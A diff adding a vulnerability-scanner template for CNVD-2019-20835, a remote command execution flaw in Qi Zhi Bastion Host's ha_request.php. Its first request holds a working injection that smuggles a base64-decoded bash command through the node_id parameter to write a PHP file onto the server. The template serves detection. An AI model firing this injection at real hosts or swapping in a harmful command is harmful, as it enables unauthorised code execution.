@@ -1,0 +1,38 @@
+id: cnvd-2019-20835-remote-command-execution
+info:
+  name: Qi Zhi Bastion Host ha_request.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cnvd-2019-20835
+  description: |
+    Exploitation of a remote command execution vulnerability in the ha_request.php endpoint of Qi Zhi Bastion Host, allowing arbitrary code execution.
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(concat('echo \"<?php echo CNVD-2019-20835;?>\">>/var/www/shterm/resources/qrcode/', t1, '.php'))}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: execute-command
+    method: GET
+    path:
+      - "{{BaseURL}}/ha_request.php?action=install&ipaddr={{Hostname}}&node_id=1${IFS}|`echo${IFS}\"{{t2}}\"|base64${IFS}-d|bash`|${IFS}|echo${IFS}"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-execution
+    method: GET
+    path:
+      - "{{BaseURL}}/var/www/shterm/resources/qrcode/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "CNVD-2019-20835"
